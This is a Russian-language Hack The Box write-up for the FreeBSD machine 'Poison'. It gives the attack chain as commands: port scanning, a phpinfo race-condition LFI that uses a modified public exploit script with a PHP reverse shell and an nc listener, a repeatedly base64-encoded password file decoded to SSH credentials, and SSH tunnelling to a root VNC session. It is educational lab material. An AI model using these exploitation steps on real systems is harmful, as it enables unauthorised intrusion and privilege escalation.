# Poison (HTB)

> Платформа: Hack The Box  
> ОС: FreeBSD  
> Сложность: Medium  
> Результат: root

---

## Attack Chain

```text
Reconnaissance
├── nmap -sC -sV -A → 22 (OpenSSH 7.2 FreeBSD), 80 (Apache 2.4.29 FreeBSD PHP/5.6.32)
└── / → "Temporary website to test local .php scripts"
    └── Ссылки: ini.php, info.php, listfiles.php, phpinfo.php

Foothold (LFI Race Condition)
├── listfiles.php → pwdbackup.txt, browse.php
├── phpinfo.php → file_uploads = On (tmp_name offset)
├── phpinfolfi.py (PayloadsAllTheThings) → модификация:
│   ├── LFIREQ: /browse.php?file=%s
│   ├── payload: php reverse shell
│   └── fix bytes vs str (Python 3)
├── nc -lnvp 9001
└── python3 phpinfolfi.py 10.129.1.254 80 100 → www shell

Lateral Movement (Credentials)
├── /var/log/httpd-access.log (Apache access log path)
├── ps -aux → Xvnc :1 (root)
├── /usr/local/www/apache24/data/pwdbackup.txt
│   └── 13x base64 decode → Charix!2#4%6&8(0
└── ssh charix@10.129.1.254 → user.txt

Privilege Escalation (VNC)
├── ~/secret.zip → scp → unzip (pass: Charix!2#4%6&8(0)
├── netstat -an | grep LIST → 5801, 5901 (VNC localhost)
├── ssh -D 1080 -L6801:127.0.0.1:5801 -L6901:127.0.0.1:5901 charix@10.129.1.254
├── proxychains4.conf → socks5 127.0.0.1 1080
└── vncviewer -passwd secret 127.0.0.1::6901 → root.txt
```

---

## Machine Briefing

FreeBSD с Apache 2.4.29 + PHP 5.6.32. На главной странице - список тестовых скриптов. VNC-сервер на localhost под root.

---

## Reconnaissance

### Port Scan

```bash
sudo nmap -sC -sV -A -T4 -Pn 10.129.1.254
```

| Порт | Сервис | Версия                                 |
|------|--------|----------------------------------------|
| 22   | SSH    | OpenSSH 7.2 (FreeBSD 20161230)         |
| 80   | HTTP   | Apache httpd 2.4.29 (FreeBSD) PHP/5.6.32 |

OS: FreeBSD 11.x.

---

## Foothold

### Изучение сайта

```
http://10.129.1.254/
```

�-аголовок: "Temporary website to test local .php scripts."

| URL           | Назначение                                             |
|---------------|--------------------------------------------------------|
| ini.php       | дамп PHP-конфигурации                                  |
| info.php      | `uname`                                                |
| listfiles.php | список файлов → pwdbackup.txt, browse.php              |
| phpinfo.php   | phpinfo, `file_uploads = On`                           |

### LFI Race Condition (phpinfo)

```bash
wget https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/File%20Inclusion/Files/phpinfolfi.py
```

Модификации:
- LFIREQ заменить на `/browse.php?file=%s`
- PHP-payload заменить на reverse shell
- Исправить работу с bytes (Python 3)

Проверка полей:

```python
i = d.find(b"[tmp_name] =>")
if i == -1:
    i = d.find(b"[tmp_name] =&gt;")
```

Listener:

```bash
nc -lnvp 9001
```

�-апуск:

```bash
python3 phpinfolfi_modifyed.py 10.129.1.254 80 100
```

Shell от `www`.

### Post-exploitation enumeration

```bash
hostname
# Poison

ls /var/log
# httpd-access.log, httpd-error.log, ...

cd /home
ls -la
# charix (drwxr-x---)

ps -aux
# Xvnc :1 (root)
```

**Ответ на задание "What is the full path to the Apache access logs?"** - `/var/log/httpd-access.log`.

### Credentials

```bash
cd /usr/local/www/apache24/data
cat pwdbackup.txt
```

Многослойный base64 (13 раз). Декодирование:

```bash
for i in $(seq 1 13); do cat pwdbackup.txt | base64 -d > /tmp/step; mv /tmp/step pwdbackup.txt; done
cat pwdbackup.txt
```

Результат: `Charix!2#4%6&8(0`.

### SSH

```bash
ssh charix@10.129.1.254
# Password: Charix!2#4%6&8(0
cat user.txt
# <USER_FLAG>
```

---

## Privilege Escalation

### Файлы в домашней директории

```bash
ls
# secret.zip
scp charix@10.129.1.254:secret.zip .
unzip secret.zip
# пароль: Charix!2#4%6&8(0
```

Внутри - бинарные данные (пароль VNC).

### Обнаружение VNC

```bash
netstat -an | grep LIST
```

Порты 5801 и 5901 на localhost.

### Туннелирование

`/etc/proxychains4.conf`:

```
socks5  127.0.0.1 1080
```

�-апуск:

```bash
ssh -D 1080 -L6801:127.0.0.1:5801 -L6901:127.0.0.1:5901 charix@10.129.1.254
```

### VNC connect

```bash
vncviewer -passwd secret 127.0.0.1::6901
```

Через VNC получаем доступ к рабочему столу root. Читаем `root.txt`.

---

## Flags

| Флаг | �-начение                         |
|------|----------------------------------|
| User | <USER_FLAG> |
| Root | (см. `/root/root.txt` через VNC) |

---

## Key Takeaways

- **LFI через phpinfo + race condition** - открытый `phpinfo()` раскрывает временный путь загруженного файла; выиграв гонку между записью tmp-файла и его удалением, можно добиться его выполнения через LFI.
- **Многослойный base64** - проверяйте, не декодируется ли строка повторно; используйте `for`-цикл.
- **VNC на localhost** - стандартный SSH-туннель (`-D` + `-L`) решает задачу доступа к изолированному сервису.
- **Пароль VNC в secret.zip** - классический приём хранения credential-файлов рядом с SSH-доступом.
- **Альтернативный вектор - log poisoning** - Apache access log доступен для чтения и записи User-Agent'ом, но в данном случае запись от `www` недоступна, что отсекает этот путь.